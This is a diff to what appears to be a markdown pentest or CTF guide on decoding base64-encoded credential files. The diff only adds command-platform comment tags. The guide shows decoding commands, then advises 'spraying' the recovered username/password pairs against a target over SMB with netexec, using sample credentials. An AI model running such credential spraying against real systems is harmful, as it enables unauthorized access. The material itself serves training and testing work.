@@ -33,6 +33,7 @@ Telltale signs: `==` padding, alphabet limited to `[A-Za-z0-9+/=]`, lines that a
 
 ### 2. Decode
 
+<!-- cmd: linux -->
 ```bash
 echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
 # Bob - !P@$$W0rD!123
@@ -42,17 +43,20 @@ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
 ```
 
 PowerShell equivalent:
+<!-- cmd: windows -->
 ```powershell
 [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Qm9iIC0gIVBAJCRXMHJEITEyMw=="))
 ```
 
 ### 3. Bulk decode every line in a file
 
+<!-- cmd: linux -->
 ```bash
 while read line; do echo "$line" | base64 -d 2>/dev/null && echo; done < passwords.txt
 ```
 
 Or in one pass:
+<!-- cmd: linux -->
 ```bash
 awk 'NF{print | "base64 -d; echo"}' passwords.txt
 ```
@@ -85,6 +89,7 @@ awk 'NF{print | "base64 -d; echo"}' passwords.txt
 
 If decoding produces `<user> - <password>` style lines, **spray them**:
 
+<!-- cmd: linux -->
 ```bash
 # SMB
 netexec smb $TARGET -u 'Bob' -p '!P@$$W0rD!123'
